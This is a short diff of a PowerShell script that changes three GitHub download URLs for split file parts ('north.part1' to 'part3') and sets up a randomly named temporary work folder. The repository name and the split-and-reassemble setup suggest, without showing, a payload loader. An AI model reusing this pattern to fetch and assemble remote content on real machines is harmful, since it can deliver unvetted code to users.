@@ -1,8 +1,8 @@
 # URLs of the 3 parts (must be raw/direct download links)
 $urls = @(
-    "https://raw.githubusercontent.com/JackAndJillContent/northwellfuckedbp/main/local.part1",
-    "https://raw.githubusercontent.com/JackAndJillContent/northwellfuckedbp/main/local.part2",
-    "https://raw.githubusercontent.com/JackAndJillContent/northwellfuckedbp/main/local.part3"
+    "https://github.com/JackAndJillContent/northwellfuckedbp/raw/refs/heads/main/north.part1",
+    "https://github.com/JackAndJillContent/northwellfuckedbp/raw/refs/heads/main/north.part2",
+    "https://github.com/JackAndJillContent/northwellfuckedbp/raw/refs/heads/main/north.part3"
 )
 
 $workDir  = Join-Path $env:TEMP ("asm_" + [guid]::NewGuid().ToString("N"))
